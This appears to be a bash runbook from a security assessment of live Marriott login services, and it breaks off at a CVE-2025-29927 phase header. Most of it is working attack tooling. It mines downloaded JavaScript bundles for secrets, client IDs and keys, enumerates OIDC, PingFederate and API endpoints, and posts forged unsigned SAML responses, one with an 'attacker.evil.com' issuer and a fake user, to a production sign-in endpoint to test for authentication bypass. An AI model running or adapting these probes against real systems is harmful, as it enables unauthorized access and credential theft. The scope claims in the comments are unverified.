#!/usr/bin/env bash
# PI-RUNBOOK-session19-mining-acs-cve.sh
#
# SESSION 19 — JS mining (fixed) + efast ACS probe + auth-apc CVE + CT enum
#
# CONTEXT (Session 18 partial results):
#   PHASE A DONE: ACS URL = https://efast.marriott.com/home (IN-SCOPE)
#     ProtocolBinding = HTTP-Artifact (SP requests artifact-based response)
#     SP signed with RSA-SHA1 (deprecated). Issuer = clr-saml2-efast.marriott.com
#     X509 cert: Claresco.eFASTTProd.SSO.marriott.com, MarriottSubCA2 (Entrust)
#   PHASE B DONE (partial): bundles downloaded to /tmp/s18/apc-chunks/
#     graphql-chunk-793e1a2cf24c51e7.js = 330KB (unmined)
#     nodeForgeVendor-4e937f79b0795bc3.js = 281KB (unmined)
#   PHASE B3 CRASHED: backtick in Python regex inside unquoted bash heredoc
#     bash interpreted r'gql`...`' as command substitution → syntax error
#     FIX: use \x60 hex escape for backtick character in all heredoc Python code
#   PHASES C, D, E, G DID NOT RUN
#
# SCOPE GUARD (non-negotiable):
#   extranetcloud.marriott.com = OUT-OF-SCOPE — do NOT probe (IdP)
#   efast.marriott.com         = IN-SCOPE (SP + ACS endpoint)
#   auth-apc.marriott.com      = IN-SCOPE
#
# CVE INTEL:
#   CVE-2025-29927 (CVSS 9.1): Next.js middleware auth bypass
#     Header: x-middleware-subrequest: middleware
#     Affects all Next.js < 14.2.25 (14.x) or < 15.2.3 (15.x)
#   CVE-2023-40148 (CVSS 6.5): PingFederate unauthenticated SSRF via POST
#
# PHASES:
#   B3 — graphql-chunk mining (fixed backtick handling)
#   B4 — nodeForge vendor mining
#   C  — auth-apc OIDC + buildManifest route enum + Next.js version detection
#   D  — efast ACS URL probe: https://efast.marriott.com/home
#   E  — CT enum retry (Certspotter + wayback CDX)
#   G  — CVE-2025-29927 + CVE-2023-40148 probe on auth-apc
#   F  — Decision gate

set -euo pipefail
OUTDIR=/tmp/s19
S18DIR=/tmp/s18
CHUNKS_DIR="$S18DIR/apc-chunks"
mkdir -p "$OUTDIR"
exec > >(tee "$OUTDIR/session19.log") 2>&1

SCOPE_FILE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/config/marriott-scope.yaml"
SCOPE_SCRIPT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)/scripts/scope-check.sh"

scope_check() {
  local host="$1"
  result=$(SCOPE_FILE="$SCOPE_FILE" "$SCOPE_SCRIPT" "$host" 2>&1) || true
  echo "scope[$host] => $result"
  if ! echo "$result" | grep -q "^IN-SCOPE"; then
    echo "ABORT: $host is OUT-OF-SCOPE. Skipping."
    return 1
  fi
  return 0
}

BASE_URL_APC="https://auth-apc.marriott.com"
BASE_URL_EFAST="https://efast.marriott.com"
APC_ASSET_BASE="${BASE_URL_APC}/mi-assets/mi-static/mi-account-renderer/web-rel-26.6.1-5d80cc6-11089/_next/static"
GRAPHQL_CHUNK="graphql-chunk-793e1a2cf24c51e7.js"
NODEFORGE_CHUNK="nodeForgeVendor-4e937f79b0795bc3.js"

# ─────────────────────────────────────────────────────────────────────────────
echo "================================================================"
echo "PHASE B3 — graphql-chunk mining (backtick fix: use \\x60)"
echo "================================================================"

scope_check "auth-apc.marriott.com" || { echo "SKIP B3"; }

GQL_FILE="$CHUNKS_DIR/$GRAPHQL_CHUNK"
if [ ! -f "$GQL_FILE" ] || [ "$(wc -c < "$GQL_FILE")" -lt 1000 ]; then
  echo "B3: Chunk not in S18 cache — re-downloading..."
  mkdir -p "$CHUNKS_DIR"
  curl -s --max-time 30 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Referer: https://auth-apc.marriott.com/login" \
    "${APC_ASSET_BASE}/chunks/${GRAPHQL_CHUNK}" \
    -o "$GQL_FILE"
fi

GQL_SIZE=$(wc -c < "$GQL_FILE" 2>/dev/null || echo 0)
echo "B3: graphql-chunk size: ${GQL_SIZE}B"

if [ "$GQL_SIZE" -gt 1000 ]; then
  python3 - <<PYEOF 2>&1 | tee "$OUTDIR/graphql-mining.txt"
import re, sys

try:
    js = open("$GQL_FILE").read()
except Exception as e:
    print(f"Cannot read: {e}")
    sys.exit(0)

print(f"File size: {len(js)} bytes")

# 1. GraphQL operations (query/mutation/subscription)
ops = re.findall(r'(?:query|mutation|subscription)\s+([A-Za-z_][A-Za-z0-9_]*)\s*[({]', js)
ops = sorted(set(ops))
print(f"\n=== GraphQL Operations ({len(ops)}) ===")
for op in ops[:80]:
    print(f"  {op}")
if len(ops) > 80:
    print(f"  ... and {len(ops)-80} more")

# 2. GraphQL endpoint URLs (avoid backtick — use \x60 for backtick char)
BT = chr(0x60)  # backtick character — safe from bash expansion
print(f"\n=== Potential Endpoints ===")
# template literal URLs (gql` ... `)
gql_templates = re.findall(r'gql' + BT + r'([^' + BT + r']{20,800})' + BT, js, re.DOTALL)
print(f"  gql template literals: {len(gql_templates)}")
for t in gql_templates[:10]:
    print(f"  ---")
    print(f"  {t[:400].strip()}")

# regular string URLs
gql_str_urls = re.findall(r'["\']([^"\']*graphql[^"\']{0,60})["\']', js, re.IGNORECASE)
gql_str_urls = sorted(set(u for u in gql_str_urls if len(u) > 3 and ' ' not in u))
print(f"\n  GraphQL URL strings ({len(gql_str_urls)}):")
for u in gql_str_urls[:20]:
    print(f"    {u}")

# API paths
api_paths = re.findall(r'["\']([^"\']*(?:/api/|/v\d+/)[^"\']{3,60})["\']', js)
api_paths = sorted(set(p for p in api_paths if len(p) > 5 and ' ' not in p))
print(f"\n  API paths ({len(api_paths)}):")
for p in api_paths[:30]:
    print(f"    {p}")

# 3. Client IDs / OAuth config
print(f"\n=== Client IDs / OAuth Config ===")
cids = re.findall(r'(?:clientId|client_id|appId|app_id|clientSecret)\s*[=:]\s*["\']([^"\']{8,80})["\']', js, re.IGNORECASE)
cids = sorted(set(cids))
for c in cids:
    print(f"  {c}")
if not cids:
    print("  (none found)")

# 4. Hardcoded secrets / API keys (entropy filter)
print(f"\n=== Potential Hardcoded Secrets (len>32, not hex digest) ===")
long_strings = re.findall(r'["\']([A-Za-z0-9+/=_-]{32,})["\']', js)
secrets = []
for s in long_strings:
    # skip pure lowercase hex (likely chunk hashes)
    if re.match(r'^[a-f0-9]+$', s):
        continue
    # skip pure base64 that looks like a hash
    if len(s) in (32, 40, 64, 128):
        continue
    secrets.append(s)
secrets = sorted(set(secrets))[:20]
for s in secrets:
    print(f"  {s[:100]}")
if not secrets:
    print("  (none found)")

# 5. Internal hostnames
print(f"\n=== Internal/Marriott/Bonvoy Hostnames ===")
hosts = re.findall(r'(?:https?://)?([a-z0-9][a-z0-9-]*(?:\.[a-z0-9-]+){2,}\.[a-z]{2,})', js, re.IGNORECASE)
hosts = sorted(set(h.lower() for h in hosts if any(k in h.lower() for k in ['marriott','bonvoy','mi-account','auth-apc','apigw','gateway'])))
for h in hosts[:30]:
    print(f"  {h}")
if not hosts:
    print("  (none found)")

# 6. JWT / auth field names
print(f"\n=== Auth/Token Field Names ===")
auth_fields = re.findall(r'["\']([^"\']*(?:token|secret|key|bearer|jwt|access_token|id_token|refresh_token|authorization)[^"\']*)["\']', js, re.IGNORECASE)
auth_fields = sorted(set(f for f in auth_fields if 5 < len(f) < 60 and ' ' not in f))
for f in auth_fields[:30]:
    print(f"  {f}")

PYEOF
else
  echo "B3: graphql-chunk not available or too small"
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE B4 — nodeForge vendor bundle mining"
echo "================================================================"

NF_FILE="$CHUNKS_DIR/$NODEFORGE_CHUNK"
if [ ! -f "$NF_FILE" ] || [ "$(wc -c < "$NF_FILE")" -lt 1000 ]; then
  echo "B4: Re-downloading nodeForge..."
  mkdir -p "$CHUNKS_DIR"
  curl -s --max-time 30 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    -H "Referer: https://auth-apc.marriott.com/login" \
    "${APC_ASSET_BASE}/chunks/${NODEFORGE_CHUNK}" \
    -o "$NF_FILE"
fi

NF_SIZE=$(wc -c < "$NF_FILE" 2>/dev/null || echo 0)
echo "B4: nodeForge size: ${NF_SIZE}B"

if [ "$NF_SIZE" -gt 1000 ]; then
  python3 - <<PYEOF 2>&1 | tee "$OUTDIR/nodeforge-mining.txt"
import re, sys

try:
    js = open("$NF_FILE").read()
except Exception as e:
    print(f"Cannot read: {e}")
    sys.exit(0)

print(f"File size: {len(js)} bytes")

# PEM blocks
pem = re.findall(r'-----BEGIN [A-Z ]+-----[^-]+-----END [A-Z ]+-----', js, re.DOTALL)
print(f"\n=== PEM Blocks ({len(pem)}) ===")
for p in pem[:5]:
    print(p[:200])
if not pem:
    print("  (none — expected for pure library code)")

# Hardcoded keys (long base64, not code patterns)
b64 = re.findall(r'["\']([A-Za-z0-9+/]{80,}={0,2})["\']', js)
b64 = sorted(set(b64))[:10]
print(f"\n=== Long Base64 Strings ({len(b64)}) ===")
for k in b64:
    print(f"  {k[:80]}...")

# RSA/crypto function calls of interest
print(f"\n=== Crypto Operations Used ===")
crypto_ops = re.findall(r'(?:forge|pki)\.[a-z]+\.[a-z]+(?:\.[a-z]+)?', js, re.IGNORECASE)
crypto_ops = sorted(set(crypto_ops))[:30]
for op in crypto_ops:
    print(f"  {op}")

# Check if used for password encryption (client-side crypto before send)
if any(k in js for k in ['encrypt', 'rsa.encrypt', 'publicKey', 'privateKey']):
    print(f"\nWARNING: node-forge used for encryption operations")
    print("  Look for: login form submitting encrypted credentials")
    print("  If server-side key is hardcoded or reused → decrypt intercepted creds")

PYEOF
else
  echo "B4: nodeForge not available"
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE C — auth-apc OIDC + buildManifest route enum + version detect"
echo "================================================================"

scope_check "auth-apc.marriott.com" || { echo "SKIP Phase C"; }

echo "--- C1: Fetch login page + extract build ID ---"
LOGIN_HTML="$OUTDIR/apc-login.html"
curl -s --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -D "$OUTDIR/apc-login-headers.txt" \
  "${BASE_URL_APC}/login" \
  -o "$LOGIN_HTML"
echo "C1: login page: $(wc -c < "$LOGIN_HTML")B"
grep -i "server\|x-powered-by\|PR_INFO\|x-one" "$OUTDIR/apc-login-headers.txt" 2>/dev/null | tr -d '\r' || true

BUILD_ID=$(python3 -c "
import re, json, sys
try:
    html = open('$LOGIN_HTML').read()
    m = re.search(r'\"buildId\":\"([^\"]+)\"', html)
    if m:
        print(m.group(1))
        sys.exit(0)
    m2 = re.search(r'<script[^>]*id=[\"\'']__NEXT_DATA__[\"\''][^>]*>([^<]+)</script>', html, re.DOTALL)
    if m2:
        d = json.loads(m2.group(1))
        print(d.get('buildId',''))
except Exception as e:
    print('')
" 2>/dev/null || echo "")
echo "C1: Build ID = '${BUILD_ID}'"

sleep 2

echo ""
echo "--- C2: buildManifest.js (all app routes) ---"
if [ -n "$BUILD_ID" ]; then
  BM_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_buildManifest.js"
  echo "C2: Fetching $BM_URL"
  curl -s --max-time 20 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "$BM_URL" \
    -o "$OUTDIR/buildManifest.js"
  BM_SIZE=$(wc -c < "$OUTDIR/buildManifest.js" 2>/dev/null || echo 0)
  echo "C2: buildManifest.js: ${BM_SIZE}B"
  if [ "$BM_SIZE" -gt 50 ]; then
    python3 - <<PYEOF 2>&1 | tee "$OUTDIR/routes.txt"
import re, json
try:
    js = open("$OUTDIR/buildManifest.js").read()
    m = re.search(r'"sortedPages"\s*:\s*(\[[^\]]+\])', js)
    if m:
        pages = json.loads(m.group(1))
        print(f"=== sortedPages ({len(pages)} routes) ===")
        for p in sorted(pages):
            print(f"  {p}")
    else:
        paths = re.findall(r'["\']([/][^"\']{1,80})["\']', js)
        paths = sorted(set(p for p in paths if p.startswith('/')))
        print(f"=== Paths ({len(paths)}) ===")
        for p in paths[:50]:
            print(f"  {p}")
except Exception as e:
    print(f"Error: {e}")
    print(open("$OUTDIR/buildManifest.js").read()[:500])
PYEOF
  fi
  sleep 1

  echo ""
  echo "--- C3: middlewareManifest.js (middleware path for CVE-2025-29927) ---"
  MW_URL="${BASE_URL_APC}/_next/static/${BUILD_ID}/_middlewareManifest.js"
  curl -s --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "$MW_URL" \
    -o "$OUTDIR/middlewareManifest.js"
  MW_SIZE=$(wc -c < "$OUTDIR/middlewareManifest.js" 2>/dev/null || echo 0)
  echo "C3: middlewareManifest.js: ${MW_SIZE}B"
  if [ "$MW_SIZE" -gt 10 ]; then
    cat "$OUTDIR/middlewareManifest.js"
  fi
  sleep 1
else
  echo "C2: Build ID not found — skipping manifest fetches"
fi

echo ""
echo "--- C4: OIDC well-known endpoints ---"
for path in \
  "/.well-known/openid-configuration" \
  "/as/.well-known/openid-configuration" \
  "/pf/.well-known/openid-configuration" \
  "/.well-known/jwks.json" \
  "/oauth2/.well-known/openid-configuration"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C4 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C5: PingFederate runtime endpoints on auth-apc ---"
for path in \
  "/pf/heartbeat.ping" \
  "/as/authorization.oauth2" \
  "/as/token.oauth2" \
  "/as/userinfo.oauth2" \
  "/idp/startSSO.ping" \
  "/sp/startSSO.ping" \
  "/sp/ACS.saml2" \
  "/ext/ref/authenticate" \
  "/pf/adapter/idp" \
  "/idp/resumeSAML20.idp"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C5 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C6: Next.js API routes ---"
for path in \
  "/api/health" \
  "/api/graphql" \
  "/api/auth" \
  "/api/auth/session" \
  "/api/auth/csrf" \
  "/api/config" \
  "/api/user"
do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}" --max-time 15 \
    -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
    "${BASE_URL_APC}${path}" 2>/dev/null || echo "000|0")
  code=$(echo "$resp" | cut -d'|' -f1)
  size=$(echo "$resp" | cut -d'|' -f2)
  echo "C6 ${path}: ${code}/${size}B"
  sleep 1
done

echo ""
echo "--- C7: Extract __NEXT_DATA__ config from login page ---"
if [ -f "$LOGIN_HTML" ]; then
  python3 - <<PYEOF 2>&1
import re, json
try:
    html = open("$LOGIN_HTML").read()
except:
    print("Cannot read login HTML")
    exit(0)

m = re.search(r'<script[^>]*id=["\']__NEXT_DATA__["\'][^>]*>([^<]+)</script>', html, re.DOTALL)
if not m:
    print("No __NEXT_DATA__ found")
    exit(0)
try:
    nd = json.loads(m.group(1))
    print("=== __NEXT_DATA__ ===")
    def walk(obj, prefix=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(v, (str, int, bool, float)) and str(v):
                    print(f"  {prefix}{k}: {str(v)[:150]}")
                elif isinstance(v, (dict, list)):
                    walk(v, prefix + k + ".")
        elif isinstance(obj, list):
            for i, v in enumerate(obj[:5]):
                walk(v, prefix + f"[{i}].")
    walk(nd)
except Exception as e:
    print(f"Parse error: {e}")
    print(m.group(1)[:500])
PYEOF
fi

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE D — efast ACS probe: https://efast.marriott.com/home"
echo "================================================================"
# ACS URL confirmed from SAMLRequest decode: https://efast.marriott.com/home
# ProtocolBinding = HTTP-Artifact — SP requests artifact-based response
# We test:
#   D1: GET /home baseline (expect 302→login or 401)
#   D2: POST /home with no body (what does ACS return?)
#   D3: POST /home with empty SAMLResponse (unsigned — expect rejection)
#   D4: POST /home with minimal valid-structure SAMLResponse (check bypass)
#   D5: POST /home with RelayState manipulation
# SAFE: we are NOT exfiltrating data, NOT using real credentials.
#       All SAMLResponse POSTs use test data with no real user assertion.
# NOTE: HTTP-Artifact binding means the SP may IGNORE direct SAMLResponse POSTs.
#       A 400 "wrong binding" or "artifact expected" response = SP is strict (correct).
#       A 200 or 302 redirect to app interior = potential auth bypass.

scope_check "efast.marriott.com" || { echo "SKIP Phase D"; }

ACS_URL="https://efast.marriott.com/home"
echo "D0: Target ACS URL: $ACS_URL"

echo ""
echo "--- D1: GET /home baseline ---"
curl -sv --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -D "$OUTDIR/d1-get-headers.txt" \
  "$ACS_URL" \
  -o "$OUTDIR/d1-get-body.html" 2>&1 | grep -E "^[<>] [A-Z]|HTTP/|< [Ll]ocation|< [Ss]et-[Cc]ookie|< [Ss]erver" | head -20 || true
D1_CODE=$(grep -m1 "^HTTP" "$OUTDIR/d1-get-headers.txt" 2>/dev/null | tr -d '\r' || echo "")
D1_SIZE=$(wc -c < "$OUTDIR/d1-get-body.html" 2>/dev/null || echo 0)
echo "D1: GET /home: $D1_CODE (${D1_SIZE}B)"
grep -i "location:" "$OUTDIR/d1-get-headers.txt" 2>/dev/null | tr -d '\r' | head -3 || true
echo "D1: Body preview (first 300 chars):"
head -c 300 "$OUTDIR/d1-get-body.html" 2>/dev/null || true

sleep 2

echo ""
echo "--- D2: POST /home with no body (empty POST) ---"
curl -sv --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -D "$OUTDIR/d2-post-headers.txt" \
  "$ACS_URL" \
  -o "$OUTDIR/d2-post-body.html" 2>&1 | grep -E "^[<>] [A-Z]|HTTP/|< [Ll]ocation|< [Ss]et-[Cc]ookie" | head -20 || true
D2_CODE=$(grep -m1 "^HTTP" "$OUTDIR/d2-post-headers.txt" 2>/dev/null | tr -d '\r' || echo "")
D2_SIZE=$(wc -c < "$OUTDIR/d2-post-body.html" 2>/dev/null || echo 0)
echo "D2: POST /home (empty): $D2_CODE (${D2_SIZE}B)"
echo "D2: Body preview:"
head -c 300 "$OUTDIR/d2-post-body.html" 2>/dev/null || true

sleep 2

echo ""
echo "--- D3: POST /home with minimal unsigned SAMLResponse ---"
# A bare SAML2 Response with Status=Success, no Assertion, no Signature.
# A properly configured SP MUST reject this (signature required).
# If it redirects to the app interior, that's a critical auth bypass.
MINIMAL_SAML=$(python3 -c "
import base64
xml = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_test_bypass_s19\" Version=\"2.0\"
  IssueInstant=\"2026-06-22T18:00:00Z\"
  InResponseTo=\"_dd69acc78f529bae1bb6d34b93ad9986\"
  Destination=\"https://efast.marriott.com/home\">
  <saml:Issuer>clr-saml2-efast.marriott.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>
  </samlp:Status>
</samlp:Response>'''
print(base64.b64encode(xml.encode()).decode())
" 2>/dev/null)

echo "D3: Posting minimal unsigned SAMLResponse to ACS..."
curl -sv --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "SAMLResponse=${MINIMAL_SAML}" \
  --data-urlencode "RelayState=https://efast.marriott.com/" \
  -D "$OUTDIR/d3-post-headers.txt" \
  "$ACS_URL" \
  -o "$OUTDIR/d3-post-body.html" 2>&1 | grep -E "^[<>] [A-Z]|HTTP/|< [Ll]ocation|< [Ss]et-[Cc]ookie" | head -20 || true
D3_CODE=$(grep -m1 "^HTTP" "$OUTDIR/d3-post-headers.txt" 2>/dev/null | tr -d '\r' || echo "")
D3_SIZE=$(wc -c < "$OUTDIR/d3-post-body.html" 2>/dev/null || echo 0)
echo "D3: POST /home (minimal SAMLResponse): $D3_CODE (${D3_SIZE}B)"
echo "D3: Body preview:"
head -c 500 "$OUTDIR/d3-post-body.html" 2>/dev/null || true

sleep 2

echo ""
echo "--- D4: POST /home with malformed SAMLResponse (no Issuer match) ---"
MALFORMED_SAML=$(python3 -c "
import base64
xml = '''<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"
  xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"
  ID=\"_test_malform_s19\" Version=\"2.0\"
  IssueInstant=\"2026-06-22T18:00:00Z\"
  Destination=\"https://efast.marriott.com/home\">
  <saml:Issuer>attacker.evil.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"/>
  </samlp:Status>
  <saml:Assertion ID=\"_test_assertion_s19\" Version=\"2.0\"
    IssueInstant=\"2026-06-22T18:00:00Z\">
    <saml:Issuer>attacker.evil.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\">testuser@marriott.com</saml:NameID>
      <saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">
        <saml:SubjectConfirmationData NotOnOrAfter=\"2027-06-22T18:00:00Z\"
          Recipient=\"https://efast.marriott.com/home\"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore=\"2020-01-01T00:00:00Z\" NotOnOrAfter=\"2027-06-22T18:00:00Z\"/>
    <saml:AuthnStatement AuthnInstant=\"2026-06-22T18:00:00Z\">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>'''
print(base64.b64encode(xml.encode()).decode())
" 2>/dev/null)

echo "D4: Posting malformed SAMLResponse (wrong Issuer, no sig, full Assertion) to ACS..."
curl -s --max-time 20 \
  -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "SAMLResponse=${MALFORMED_SAML}" \
  --data-urlencode "RelayState=https://efast.marriott.com/" \
  -D "$OUTDIR/d4-post-headers.txt" \
  "$ACS_URL" \
  -o "$OUTDIR/d4-post-body.html"
D4_CODE=$(grep -m1 "^HTTP" "$OUTDIR/d4-post-headers.txt" 2>/dev/null | tr -d '\r' || echo "")
D4_SIZE=$(wc -c < "$OUTDIR/d4-post-body.html" 2>/dev/null || echo 0)
echo "D4: POST /home (malformed SAMLResponse): $D4_CODE (${D4_SIZE}B)"
echo "D4: Body preview:"
head -c 500 "$OUTDIR/d4-post-body.html" 2>/dev/null || true

sleep 2

echo ""
echo "--- D5: Analyze ACS probe results ---"
python3 - <<'PYEOF'
import os, re

outdir = "/tmp/s19"

def analyze_acs(label, headers_file, body_file):
    try:
        headers = open(headers_file).read() if os.path.exists(headers_file) else ""
        body = open(body_file).read() if os.path.exists(body_file) else ""
    except:
        return

    http_code = ""
    for line in headers.splitlines():
        if line.startswith("HTTP"):
            http_code = line.strip()
            break

    size = len(body)

    # Extract Location header
    loc = ""
    for line in headers.splitlines():
        if line.lower().startswith("location:"):
            loc = line.strip()
            break

    # Check cookies
    cookies = [l.strip() for l in headers.splitlines() if l.lower().startswith("set-cookie:")]

    # Bypass signals (BAD — means SP accepted the forge)
    bypass_patterns = [
        (r'(?:dashboard|bookings?|rewards?|loyalty|account|profile|welcome|member)', "APP CONTENT"),
        (r'logout|signout|sign.out', "AUTHENTICATED SESSION INDICATOR"),
        (r'JSESSIONID|auth_token|access_token', "SESSION TOKEN SET"),
    ]
    # Rejection signals (GOOD — correct SP behavior)
    reject_patterns = [
        (r'(?:invalid|error|rejected|failed|denied|signature|verification)', "VALIDATION ERROR"),
        (r'artifact|expected.*artifact|wrong.*binding', "BINDING ERROR (expected for HTTP-Artifact)"),
        (r'400|401|403|500', "ERROR HTTP CODE"),
        (r'InResponseTo.*not.*found|cannot.*find.*response', "INRESPONSETO MISMATCH"),
    ]

    print(f"\n{'='*60}")
    print(f"  {label}")
    print(f"  HTTP: {http_code} | Size: {size}B")
    if loc:
        print(f"  Location: {loc}")
    if cookies:
        print(f"  Set-Cookie: {', '.join(cookies[:3])}")

    verdict = "UNKNOWN"
    for pat, msg in bypass_patterns:
        if re.search(pat, body, re.IGNORECASE):
            verdict = f"!!! POTENTIAL BYPASS — {msg} !!!"
            break
    if verdict == "UNKNOWN":
        for pat, msg in reject_patterns:
            if re.search(pat, body + headers, re.IGNORECASE):
                verdict = f"REJECTED ({msg})"
                break
    if verdict == "UNKNOWN":
        if size < 100:
            verdict = "EMPTY RESPONSE — ambiguous"
        elif loc and "login" in loc.lower():
            verdict = "REJECTED (redirect to login)"
        else:
            verdict = "AMBIGUOUS — manual review needed"

    print(f"  VERDICT: {verdict}")
    if "BYPASS" in verdict:
        print(f"  Body preview: {body[:500]}")

analyze_acs("D1 GET /home (baseline)", f"{outdir}/d1-get-headers.txt", f"{outdir}/d1-get-body.html")
analyze_acs("D2 POST /home (empty)", f"{outdir}/d2-post-headers.txt", f"{outdir}/d2-post-body.html")
analyze_acs("D3 POST /home (minimal unsigned SAMLResponse)", f"{outdir}/d3-post-headers.txt", f"{outdir}/d3-post-body.html")
analyze_acs("D4 POST /home (malformed SAMLResponse, wrong Issuer)", f"{outdir}/d4-post-headers.txt", f"{outdir}/d4-post-body.html")

print(f"\n{'='*60}")
print("INTERPRETATION GUIDE:")
print("  HTTP-Artifact SP should: ignore direct SAMLResponse POSTs, OR return 400/binding error")
print("  If any D2-D4 returns redirect to app interior or sets session cookie: CRITICAL bypass")
print("  If all return 400/SAML-error: SP correctly validates binding and signature")
PYEOF

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE E — CT enum retry (Certspotter + wayback CDX)"
echo "================================================================"

echo "--- E1: crt.sh retry ---"
for wildcard in "%.apigwc.marriott.com" "%.apigatewayc.marriott.com" "%.uat.marriott.com" "%.artifactory.marriott.com"; do
  resp=$(curl -s -o "$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json" \
    -w "%{http_code}" --max-time 25 \
    "https://crt.sh/?q=${wildcard}&output=json" 2>/dev/null || echo "000")
  size=$(wc -c < "$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json" 2>/dev/null || echo 0)
  echo "E1 $wildcard: HTTP $resp (${size}B)"
  if [ "$resp" = "200" ] && [ "$size" -gt 50 ]; then
    python3 -c "
import json
try:
    data = json.load(open('$OUTDIR/crtsh-$(echo $wildcard | tr '%./' '_').json'))
    hosts = set()
    for c in data:
        for n in c.get('name_value','').split('\n'):
            n = n.strip().lstrip('*.')
            if 'marriott.com' in n: hosts.add(n.lower())
    print(f'  {len(hosts)} unique hosts:')
    for h in sorted(hosts)[:30]: print(f'    {h}')
except Exception as e:
    print(f'  Parse error: {e}')
" 2>/dev/null || true
  fi
  sleep 3
done

echo ""
echo "--- E2: Wayback CDX API ---"
for wildcard in "*.apigwc.marriott.com" "*.apigatewayc.marriott.com" "*.uat.marriott.com"; do
  domain=$(echo "$wildcard" | sed 's/^\*\.//')
  resp=$(curl -s -o "$OUTDIR/wayback-${domain}.json" \
    -w "%{http_code}" --max-time 30 \
    "https://web.archive.org/cdx/search/cdx?url=${wildcard}&output=json&fl=original&collapse=urlkey&limit=200" \
    2>/dev/null || echo "000")
  size=$(wc -c < "$OUTDIR/wayback-${domain}.json" 2>/dev/null || echo 0)
  echo "E2 $wildcard: HTTP $resp (${size}B)"
  if [ "$resp" = "200" ] && [ "$size" -gt 20 ]; then
    python3 -c "
import json
from urllib.parse import urlparse
try:
    data = json.load(open('$OUTDIR/wayback-${domain}.json'))
    hosts = set()
    for entry in data[1:]:
        if entry:
            h = urlparse(entry[0]).netloc.lower()
            if h: hosts.add(h)
    print(f'  {len(hosts)} unique hosts:')
    for h in sorted(hosts)[:30]: print(f'    {h}')
except Exception as e:
    print(f'  Error: {e}')
" 2>/dev/null || true
  fi
  sleep 3
done

sleep 2

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "================================================================"
echo "PHASE G — CVE-2025-29927 (Next.js middleware bypass) + CVE-2023-40148 (PF SSRF)"
echo "================================================================"
# CVE-2025-29927: CVSS 9.1 — bypass all Next.js middleware-based auth checks
# Exploit: add header  x-middleware-subrequest: <middleware-path>
# Fixed in: Next.js 14.2.25+ (14.x) / 15.2.3+ (15.x)
# auth-apc build: mi-account-renderer/web-rel-26.6.1-5d80cc6-11089 (Next.js version unknown)

